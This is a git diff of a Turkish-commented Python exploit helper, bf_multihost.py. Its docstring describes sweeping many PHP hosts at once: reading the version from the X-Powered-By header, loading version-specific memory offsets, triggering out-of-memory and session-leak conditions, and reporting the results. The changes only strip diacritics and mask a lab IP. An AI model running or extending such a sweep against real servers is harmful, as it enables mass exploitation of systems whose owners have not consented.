@@ -1,17 +1,17 @@
 #!/usr/bin/env python3
 """Multi-host brute-force sweep — tam URL + X-Powered-By → versiyon → otomatik offset.
 
-20-30 host'u tek komutla sweep eder. Her host için:
+20-30 host'u tek komutla sweep eder. Her host icin:
   1. GET <path> → X-Powered-By: PHP/X.Y.Z oku
   2. labs/versions/X.Y.Z/offsets.env'den ZIF_OFFSET + DTOR_OFFSET doldur
   3. Basit bf: OOM (size vary) → simple session-init → Set-Cookie sinyali
   4. Rapor: URL, version, offsets, OOM status, leak status
 
 Usage:
-  # Tam URL listesi (virgülle):
-  python3 bf_multihost.py --hosts https://xxx.com/index.php,http://192.168.8.123:18113/index.php
+  # Tam URL listesi (virgulle):
+  python3 bf_multihost.py --hosts https://xxx.com/index.php,http://LAB_IP:18113/index.php
 
-  # host listesi dosyasından (satır başına tam URL):
+  # host listesi dosyasindan (satir basina tam URL):
   python3 bf_multihost.py --hosts-file hosts.txt
 
   # OOM field size sweep:
@@ -42,7 +42,7 @@ def probe_host(host: str, port: int, path: str, use_tls: bool) -> dict:
         "host": host, "port": port, "path": path, "use_tls": use_tls,
         "status": st,
         "xpb": xpb, "version": ver,
-        "known": bool(offs),          # versiyon labs/versions/ listesinde var mı?
+        "known": bool(offs),          # versiyon labs/versions/ listesinde var mi?
         "zif": offs.get("ZIF_OFFSET", "?"),
         "dtor": offs.get("DTOR_OFFSET", "?"),
         "delta": offs.get("DELTA", ""),
